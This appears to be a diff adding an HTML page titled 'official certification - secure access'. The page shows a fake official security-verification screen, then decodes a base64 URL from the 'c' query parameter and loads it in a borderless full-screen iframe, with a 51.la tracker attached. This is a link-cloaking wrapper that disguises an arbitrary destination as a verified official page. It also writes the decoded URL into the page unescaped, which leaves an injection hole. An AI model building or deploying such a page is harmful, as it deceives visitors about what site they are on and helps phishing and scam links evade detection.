@@ -1,0 +1,141 @@
+<html lang="zh-CN">
+<head>
+  <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport">
+  <meta content="yes" name="apple-mobile-web-app-capable">
+  <meta content="yes" name="apple-touch-fullscreen">
+  <meta content="black" name="apple-mobile-web-app-status-bar-style">
+  <meta content="320" name="MobileOptimized">
+  <title>官方认证-安全访问</title>
+<style>
+/* 加载容器样式 */
+.loading-container {
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    top: 0;
+    left: 0;
+    background-color: #f8f9fa;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
+
+/* 安全访问文字样式 */
+.security-text {
+    font-size: 24px;
+    color: #28a745; /* 安全绿 */
+    font-weight: bold;
+    letter-spacing: 1px;
+    margin-bottom: 20px;
+}
+
+/* 安全图标样式 */
+.security-icon {
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background-color: #28a745;
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 30px;
+    margin-bottom: 15px;
+}
+
+/* 加载提示文字 */
+.loading-tip {
+    color: #6c757d;
+    font-size: 14px;
+}
+
+/* iframe容器样式 */
+.content{
+    height:100%;
+    width:100%;
+    position: fixed;
+    left: -2px;
+    top: -2px;
+}
+</style>
+<body>
+
+<div class="loading-container" id="loadingContainer">
+    <div class="security-icon">✓</div>
+    <div class="security-text">官方安全验证</div>
+    <div class="loading-tip">正在进行身份认证与安全协议验证，请稍候...</div>
+</div>
+
+<script>
+// 立即执行参数解析和处理，无任何延迟
+(function() {
+    var urlParams = new URLSearchParams(window.location.search);
+    var encodedParam = urlParams.get('c');
+    var tureurl = atob(encodedParam);
+
+    if (tureurl.includes("http")) {
+        // 立即隐藏加载动画，不添加任何延迟
+        var loadingContainer = document.getElementById("loadingContainer");
+        loadingContainer.style.display = "none";
+
+        // 直接插入iframe
+        var html = '<iframe class="content" onload="bindMouseWhee(this)" src="' + tureurl + '"></iframe>';
+        document.writeln(html);
+        console.log(tureurl);
+    } else {
+        console.log("nourls");
+    }
+})();
+</script>
+
+<script>
+var firefox = navigator.userAgent.indexOf('Firefox') != -1;
+
+// 修改鼠标滚轮事件处理，避免跨域错误提示
+function MouseWheel(e, doc) {
+    try {
+        e.preventDefault && e.preventDefault();
+        e.returnValue = false;
+        var up = firefox && e.detail < 0 || e.wheelDelta > 0;
+        doc.body.scrollTop = doc.documentElement.scrollTop += up ? -50 : 50;
+    } catch (e) {
+        console.log('跨域环境下无法控制滚动:', e);
+    }
+}
+
+function bindMouseWhee(ifr) {
+    try {
+        // 检查是否同源
+        var isSameOrigin = false;
+        try {
+            // 尝试访问origin属性验证是否同源
+            var iframeOrigin = new URL(ifr.src).origin;
+            isSameOrigin = window.location.origin === iframeOrigin;
+        } catch (e) {
+            console.log('无法验证同源性:', e);
+        }
+
+        if (isSameOrigin) {
+            var doc = ifr.contentWindow.document;
+            if (firefox) {
+                doc.addEventListener('DOMMouseScroll', function(e) {
+                    MouseWheel(e, doc);
+                }, false);
+            } else {
+                doc.onmousewheel = function(e) {
+                    MouseWheel(e || ifr.contentWindow.event, doc);
+                };
+            }
+        } else {
+            console.log('检测到跨域iframe，将不绑定滚动事件以避免安全错误');
+        }
+    } catch (e) {
+        console.log('绑定滚动事件失败:', e);
+    }
+}
+</script>
+<script type="text/javascript" src="https://js.users.51.la/21480123.js"></script>
+</body>
+</html>
